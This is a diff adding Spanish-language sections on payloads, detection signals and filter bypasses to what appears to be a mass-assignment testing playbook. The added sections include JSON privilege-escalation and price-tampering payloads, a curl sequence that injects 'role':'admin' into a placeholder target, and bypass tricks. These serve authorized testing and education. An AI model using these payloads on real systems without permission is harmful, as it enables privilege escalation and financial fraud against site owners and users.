@@ -96,6 +96,50 @@ chains_with: [api-abuse, broken-access-control, business-logic]
 - `arjun` for scaled hidden-parameter discovery across an endpoint.
 - Burp Suite **Autorize**/Repeater for manual iteration and request duplication across accounts.
 
+## Payloads & Detection Patterns
+
+Una familia por tipo de campo inyectado. La prueba exige un **GET fresco** que confirme la
+persistencia server-side: un PATCH/POST 200 no basta (algunos frameworks aceptan y descartan el
+campo desconocido respondiendo éxito). Cosecha primero los nombres reales del GET del objeto.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Privilege flat field | `{"role":"admin"}`, `{"isAdmin":true}`, `{"is_staff":true}` | Elevar privilegio en update/registro |
+| Trust/verify field | `{"verified":true,"email_verified":true,"approved":true}` | Saltar la aprobación/verificación manual |
+| Financial field | `{"total_price":0.01}`, `{"balance":9999}`, `{"discount_percent":100}` | Tampering de precio/saldo |
+| Ownership/relation | `{"user_id":99}`, `{"org_id":...}` | Reasignar el recurso a otra entidad |
+| Nested object | `{"profile":{"role":"admin"}}` | Evadir el filtrado que solo mira campos planos |
+| Signup-time inject | `POST /register` con campos privilegiados | Privilegio instantáneo en la creación de cuenta |
+
+Surface signals que delatan la clase antes de inyectar:
+- Create/update con body de muchos campos (`PATCH /api/users/me`, `POST /register`, `PUT /api/orders/{id}`).
+- Framework de auto-binding: Rails sin `strong_parameters`, Mongoose `Model.create(req.body)`,
+  DRF `fields='__all__'`, Spring `@RequestBody` a entidad, Eloquent sin `$fillable`/`$guarded`.
+- GET del mismo objeto revela campos no renderizados (`role`, `isAdmin`, `verified`, `credit_balance`, `plan_tier`).
+- Flujos con aprobación/verificación manual → existe un boolean `verified`/`approved` server-side.
+
+```bash
+# 1. cosechar los nombres reales de campos del GET (justifica qué inyectar)
+curl -s https://target/api/users/me -H "Authorization: Bearer $TOKEN" | jq 'keys'
+# 2. inyectar el campo privilegiado
+curl -s -X PATCH https://target/api/users/me -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" -d '{"name":"t","role":"admin"}'
+# 3. CONFIRMAR persistencia con GET fresco (no confiar en el echo del PATCH)
+curl -s https://target/api/users/me -H "Authorization: Bearer $TOKEN" | jq '.role'
+```
+
+## Bypass Techniques
+
+Agrupadas por el filtro de binding evadido; probar 2–3 nombres distintos antes de cerrar como N/A.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Allow-list de campos planos | Anidar bajo objeto/relación (`{"profile":{"role":"admin"}}`) | El filtro flat no cubre lo nested |
+| Validación de valor (no de presencia) | Enum válido no-pretendido (`role:"admin"` en vez de `"superadmin"`) | Rechaza el valor inválido, acepta el válido user-settable |
+| Un solo verbo filtrado | Probar PUT vs PATCH vs POST en el mismo endpoint | Binding distinto por verbo en el mismo framework |
+| Nombre de campo distinto | `is_admin`/`isAdmin`/`admin`/`role`/`roles[]`, snake vs camel | Depende del atributo real (cosechar del GET) |
+| Echo sin persistencia (falso N/A) | Verificar siempre con un GET independiente | Framework ignora el campo desconocido pero responde 200 |
+
 ## Root Causes
 
 - ORM/framework binds the entire request body onto a model instance without an explicit allow-list (`strong_parameters`, DRF serializer `fields`, Mongoose `select`, explicit DTO mapping).
